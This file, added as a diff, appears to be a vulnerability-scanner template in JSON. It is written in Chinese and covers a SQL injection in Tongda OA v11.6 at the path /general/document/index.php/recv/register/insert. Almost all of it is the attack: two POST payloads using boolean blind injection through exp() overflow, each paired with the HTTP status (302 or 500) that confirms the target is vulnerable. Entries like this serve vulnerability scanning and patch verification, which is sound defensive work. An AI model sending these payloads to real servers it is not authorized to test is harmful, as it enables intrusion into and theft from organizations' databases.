@@ -1,0 +1,52 @@
+{
+  "product": "通达OA",
+  "vul_name": "通达OA v11.6 general_document_index.php_recv_register_insert 接口SQL注入",
+  "type": "SQL注入",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "通达OA v11.6_SQL注入漏洞(general/document/index.php/recv/register/insert)",
+  "version": "通达OA v11.6",
+  "note": "",
+  "search": {},
+  "protocol": "http",
+  "link": "https://blog.csdn.net/qq_44657899/article/details/115804216",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "exploit": [
+    {
+      "exp": {
+        "method": "post",
+        "follow": false,
+        "path": "/general/document/index.php/recv/register/insert",
+        "data": "title)values(\"'\"^exp(if(1<2,1,710)))#=&_SERVER="
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "status": 302
+          }
+        ]
+      }
+    },
+    {
+      "exp": {
+        "method": "post",
+        "follow": false,
+        "path": "/general/document/index.php/recv/register/insert",
+        "data": "title)values(\"'\"^exp(if(1<1,1,710)))#=&_SERVER="
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "status": 500
+          }
+        ]
+      }
+    }
+  ]
+}
